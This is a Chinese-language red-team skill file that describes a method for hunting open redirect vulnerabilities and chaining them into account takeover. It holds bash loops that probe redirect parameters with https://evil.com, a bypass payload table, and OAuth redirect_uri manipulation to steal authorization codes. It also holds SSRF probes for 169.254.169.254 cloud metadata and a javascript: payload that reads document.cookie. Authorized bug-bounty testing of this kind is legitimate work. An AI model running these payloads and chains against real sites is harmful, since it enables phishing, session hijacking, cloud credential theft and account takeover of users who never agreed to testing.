---
name: hunt-open-redirect
description: 猎捕开放重定向——涵盖所有类型，包括低影响类型，可串联至 OAuth token 窃取 → ATO、钓鱼链。URL 参数操纵、JavaScript 重定向、meta refresh、响应头注入。适用于挖掘重定向漏洞或构建 ATO 攻击链时。
version: 1.1.0
revision_date: 2026-07-25
license: MIT
platforms: [linux]
metadata:
  tags: [open-redirect, hunt, redteam]
  category: redteam
---

# HUNT-OPEN-REDIRECT — 开放重定向

## When to Use

当目标存在任何重定向参数（?url=、?next=、?redirect=、?return=、?redirect_uri= 等），位于登录/登出流程、OAuth 授权端点、语言切换、支付重定向，或任何控制操作后用户跳转位置的参数时使用。开放重定向本身在大多数项目中为 Low，但当其串联至 OAuth token 窃取（redirect_uri 绕过）或 SSRF 升级时即变为 Critical。任何可配置 redirect_uri 的 OAuth 授权端点都是最高价值目标。

## Prerequisites

- 针对目标的明确授权、目标边界与速率限制。
- 工具：`curl`、`gf`、`nuclei`。
- 可写的证据目录：`export OUTPUT_DIR="${OUTPUT_DIR:-./output}" && mkdir -p "$OUTPUT_DIR"`。
- 对于任何改变状态的步骤（写入、上传、凭据尝试），必须在执行命令前立即获得明确确认。

## How to Run

```bash
# Set once per engagement; every step below uses these.
TARGET="example.com"   # or the engagement target
export OUTPUT_DIR="${OUTPUT_DIR:-./output}"

COLLAB="https://evil.com"
cat recon/$TARGET/redirect-candidates.txt | qsreplace "$COLLAB" | while read url; do
  LOC=$(curl --max-time 30 --connect-timeout 10 -s -I --max-redirs 0 "$url" | grep -i "^location:")
  STATUS=$(curl --max-time 30 --connect-timeout 10 -s -o /dev/null -w "%{http_code}" --max-redirs 0 "$url")
  [ -n "$LOC" ] && echo "$STATUS | $LOC | $url"
done
```

## Procedure

下述阶段即为操作流程。保持每个探测请求有界（`--max-time`），将证据记录在 `OUTPUT_DIR` 之下，并在 Pitfalls 中列出的停止条件处停止。

## 皇冠明珠目标

开放重定向本身为 Low。串联至 OAuth = Critical（ATO）。

**最高价值的攻击链：**
- **开放重定向 → OAuth 授权码窃取**——redirect_uri 在受信任域上存在开放重定向 → 授权码发送给攻击者 → ATO
- **开放重定向 → 钓鱼**——用户信任该 URL，因为它以 target.com 开头
- **开放重定向 → SSRF 升级**——如果重定向在服务端被跟随 → SSRF
- **开放重定向 → 会话固定**——强制用户以预先设置的会话登录

---

## 攻击面信号

```
?redirect=
?next=
?url=
?return=
?returnTo=
?continue=
?dest=
?destination=
?go=
?forward=
?location=
?target=
?redir=
?redirect_uri=
?callback=
?checkout_url=
?success_url=
?cancel_url=
/logout?returnTo=
/login?next=
/sso?callback=
```

---

## 绕过表

| 技术 | Payload |
|-----------|---------|
| 基础 | `https://evil.com` |
| 协议相对 | `//evil.com` |
| 反斜杠绕过 | `/\\evil.com` |
| At 符号混淆 | `https://target.com@evil.com` |
| 双斜杠 | `//evil.com/%2F..` |
| URL 编码 | `%2Fevil.com` |
| 空字节 | `evil.com%00target.com` |
| 空白字符 | `evil.com%09` 或 `%20` |
| JavaScript URI | `javascript:window.location='https://evil.com'` |
| Data URI | `data:text/html,<script>window.location='https://evil.com'</script>` |
| 子域 | `https://target.com.evil.com` |
| 片段 | `https://evil.com#.target.com` |

---

## 常见根因

1. **参数白名单而无校验**——开发者维护了一份重定向参数列表（`url`、`next`、`return`），但只校验该参数*是否存在*，而不校验其值。
2. **用户友好的重定向功能**——登录后重定向、登出重定向以及语言切换功能都需要跳转到用户控制的目标。
3. **第三方 OAuth/SAML 库**——许多认证库允许宽松地配置 `redirect_uri` 校验（前缀匹配、后缀匹配、通配符），会匹配到攻击者控制的子域。
4. **SSO 实现的捷径**——开发者将 `redirect_uri` 配置为接受当前请求的 Host 头，从而产生基于 Host 头的开放重定向。
5. **假定 JSON 请求体是安全的**——API 请求中基于 POST 的重定向参数，常常跳过了基于 GET 的重定向所强制执行的校验。
6. **片段与换行符处理**——URL 解析器对 URL 何处结束存在分歧；换行符和回车符可能突破 URL 校验。

## 真实案例

**场景 A——OAuth redirect_uri 通配符 → 一键 ATO**
某网约车平台的 OAuth 实现接受匹配 `*.uberinternal.com` 的 `redirect_uri` 值。攻击者发现 `support.uberinternal.com` 处有一个可被认领的悬空子域。通过构造带有 `redirect_uri=https://support.uberinternal.com/oauth-callback` 的 authorize URL，攻击者可以拦截任何点击该链接用户的授权码，将其兑换为访问令牌，并实现完全的账户接管。影响：Critical——通过单条构造的链接实现完整的用户账户接管。

**场景 B——密码重置邮件中的登出重定向 → 会话劫持**
某大型电商平台的密码重置邮件中包含一个带有 `redirect_to` 参数的登出链接：`https://target.com/logout?redirect_to=https://target.com/reset-complete`。`redirect_to` 参数接受任意 URL，包括 `https://evil.com`。能够拦截重置邮件（通过邮箱沦陷或 MitM）的攻击者可以修改重定向目标。受害者重置密码后会被重定向到攻击者站点，而新的会话 cookie 仍然有效，可被跨源外带。影响：密码重置后的会话劫持。

## 逐步挖掘方法论

### 阶段 1——发现重定向参数
```bash
# Extract all redirect candidates from crawl
cat recon/$TARGET/urls.txt | gf redirect > recon/$TARGET/redirect-candidates.txt
wc -l recon/$TARGET/redirect-candidates.txt

# Less common param names
grep -E "(\?|&)(return|next|dest|go|forward|location|to|jump|target|out|link|logout)" \
  recon/$TARGET/urls.txt >> recon/$TARGET/redirect-candidates.txt
```

### 阶段 2——基础测试
```bash
COLLAB="https://evil.com"
cat recon/$TARGET/redirect-candidates.txt | qsreplace "$COLLAB" | while read url; do
  LOC=$(curl --max-time 30 --connect-timeout 10 -s -I --max-redirs 0 "$url" | grep -i "^location:")
  STATUS=$(curl --max-time 30 --connect-timeout 10 -s -o /dev/null -w "%{http_code}" --max-redirs 0 "$url")
  [ -n "$LOC" ] && echo "$STATUS | $LOC | $url"
done
```

### 阶段 3——绕过技术
```bash
BASE_URL="https://$TARGET/redirect?url="
PAYLOADS=(
  "https://evil.com"
  "//evil.com"
  "/\\evil.com"
  "https://$TARGET@evil.com"
  "https://evil.com%23.$TARGET"
  "https://evil.com%09"
)
for P in "${PAYLOADS[@]}"; do
  LOC=$(curl --max-time 30 --connect-timeout 10 -s -I --max-redirs 0 "${BASE_URL}${P}" | grep -i "^location:")
  echo "$P → $LOC"
done
```

### 阶段 4——OAuth 链测试
```bash
# If target has OAuth, check if redirect_uri accepts open redirect
grep -i "oauth\|authorize\|redirect_uri" recon/$TARGET/urls.txt | head -20

# Construct OAuth URL with open redirect as redirect_uri
# Normal: redirect_uri=https://target.com/callback
# Attack: redirect_uri=https://target.com/redirect?url=https://evil.com
OAUTH_URL="https://$TARGET/oauth/authorize"
curl --max-time 30 --connect-timeout 10 -sv "$OAUTH_URL?response_type=code&client_id=CLIENT_ID&redirect_uri=https://$TARGET/redirect%3Furl%3Dhttps%3A%2F%2Fevil.com" 2>&1 | grep -i "location:"
```

### 阶段 5——服务端重定向（SSRF 升级）
```bash
# If the app fetches the redirect target server-side (302 fetch follow)
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/proxy?url=https://evil.com/redirect-to-169.254.169.254/latest/meta-data/"

# Or: if app makes HTTP request to the redirect destination
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/fetch?url=http://169.254.169.254/latest/meta-data/" \
  -H "Cookie: $SESSION"
```

---

## 自动化
```bash
# openredirex
pip3 install openredirex
openredirex -l recon/$TARGET/redirect-candidates.txt -p evil.com

# nuclei
nuclei -u https://$TARGET -t redirect/ -severity medium,high

# gf + qsreplace
cat recon/$TARGET/urls.txt | gf redirect | qsreplace "https://evil.com" | \
  xargs -I{} curl --max-time 30 --connect-timeout 10 -s -o /dev/null -w "%{http_code} %{redirect_url}\n" --max-redirs 0 {}
```

---

## 攻击链表

| 开放重定向发现 | 串联至 | 影响 |
|----------------------|----------|--------|
| 任意开放重定向 | OAuth redirect_uri 绕过 | 授权码窃取 → ATO |
| 任意开放重定向 | 带目标域名的钓鱼 URL | 社会工程 |
| 服务端重定向 | 经由被跟随的重定向实现 SSRF | 访问内部服务 |
| 登出重定向 | 会话固定 | 以已知会话强制登录 |

---

## 校验

✅ 响应中的 Location 头指向 evil.com（你控制的域名）
✅ 浏览器跟随重定向至攻击者控制的页面

**严重性：**
- 仅重定向：Low（大多数项目）
- 串联至 OAuth 授权码窃取 → ATO：High/Critical
- 串联至带品牌的钓鱼：Low-Medium
- 服务端 → SSRF：High

## Pitfalls
- **开放重定向本身为 Low**——大多数漏洞赏金项目对未串联至 OAuth/ATO 的开放重定向只支付 Low。
- **重定向中的 javascript: scheme**——重定向参数中的 `javascript:alert(1)` 是 XSS，不是开放重定向。要区分这两者。
- **重定向中的 CRLF 注入**——重定向参数中的 `%0d%0a` 可造成响应头注入。其影响高于开放重定向。
- **Meta refresh 重定向**——`<meta http-equiv="refresh">` 重定向比 3xx 更难利用。要记录攻击场景（钓鱼，而非自动化）。

---

## Verification
- 响应必须携带指向攻击者主机的 `Location:` 头，并使用 `--max-redirs 0` 捕获。
- Meta-refresh 或 JavaScript 重定向需要浏览器 PoC 才能计入。
- 确切的 URL、重定向目标以及完整响应头记录在 `${OUTPUT_DIR:-./output}` 之下。

---

## 相关技能

- **`hunt-oauth`**——OAuth `redirect_uri` 上的开放重定向可将 Low 发现变为 Critical ATO。链原语：`redirect_uri=https://target.com/redirect?url=https://evil.com` → 授权码落在 evil.com → 兑换为 token → ATO。
- **`hunt-ssrf`**——如果 302 重定向在*服务端*被跟随（图片代理、链接预览），开放重定向就变成 SSRF。链原语：服务端 URL 抓取器跟随从攻击者主机到 `http://169.254.169.254/latest/meta-data/` 的 302 → 云凭据。
- **`hunt-ato`**——密码重置链接若在返回 URL 中包含开放重定向，会泄露 token。链原语：重置邮件包含 `https://target.com/reset?token=X&redirect=https://evil.com` → 通过 Referer 或重定向外带 token。
- **`hunt-xss`**——重定向参数中的 `javascript:` 协议会产生单击 XSS。链原语：`?redirect=javascript:alert(document.cookie)` → 无需服务端注入即可窃取会话 cookie。
- **`hunt-host-header`**——经由 Host 头注入的开放重定向与本类重叠。链原语：Host: evil.com → 服务器根据 Host 构造重定向 Location → 受害者被重定向到攻击者主机。
- **`security-arsenal`**——加载 Open Redirect Bypass Table：协议相对 `//evil.com`、反斜杠 `\\evil.com`、at 符号 `@evil.com`、双斜杠编码、空字节、空白注入、data: URI。
- **`triage-validation`**——应用严重性预门禁。独立开放重定向在大多数项目中为 Low。只有当你证明攻击链（OAuth token 窃取、会话固定、SSRF 升级）时才可提交 High+。
